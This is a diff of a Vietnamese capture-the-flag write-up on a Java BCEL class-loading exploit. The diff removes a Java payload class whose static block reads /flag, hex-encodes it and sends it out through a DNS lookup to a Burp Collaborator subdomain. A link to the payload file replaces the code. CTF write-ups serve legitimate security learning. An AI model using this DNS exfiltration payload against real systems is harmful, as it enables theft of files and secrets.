@@ -600,66 +600,7 @@ Payload:
 ```  
 Trong đó, `<class dump>` là các file `.class` đã được encode dạng `BCELEncode`. Ý tưởng đọc flag ở `/flag` sau đó encode dưới dạng `hex` chèn vào `Burp collaborator client` như một domain, sau đó lắng nghe DNS lookup và lấy flag.  
   
-```
-import javax.script.ScriptEngine;
-import javax.script.ScriptEngineManager;
-import javax.script.ScriptException;
-import java.io.DataInputStream;
-import java.io.File;
-import java.io.FileInputStream;
-import java.io.IOException;
-import java.net.MalformedURLException;
-import java.net.URL;
-import java.net.URLConnection;
-import java.nio.file.Files;
-import java.nio.file.Paths;
-
-public class Dummy {
-    static {
-        try {
-            getFlag();
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-
-    }
-    private static final char[] HEX_ARRAY = "0123456789ABCDEF".toCharArray();
-
-    public static String byteArrayToHex(byte[] a) {
-        StringBuilder sb = new StringBuilder(a.length * 2);
-        for(byte b: a)
-            sb.append(String.format("%02x", b));
-        return sb.toString();
-    }
-
-    public static void leakFlag(String c) throws MalformedURLException {
-        URL yahoo = new URL("http://"+c+".648yq47p874in51d8874eiy2vt1jp8.burpcollaborator.net");
-        yahoo.hashCode();
-    }
-
-    public static void getFlag() throws Exception {
-        try {
-            byte[] dt = Files.readAllBytes(Paths.get("/flag"));
-            leakFlag(byteArrayToHex(dt));
-
-        } catch (MalformedURLException me) {
-            System.out.println("MalformedURLException: " + me);
-        } catch (IOException ioe) {
-            System.out.println("IOException: " + ioe);
-        }
-
-    }
-
-    public static void main(String[] args) {
-        try {
-            getFlag();
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-
-}
-```  
+Payload: [Dummy.java](https://drive.google.com/file/d/1l1OhbkkHUiZ8azrui36k-MnrJfNa4KTo/view?usp=sharing)  
 Command:  
 ```bash  
 > $ javac Dummy.java
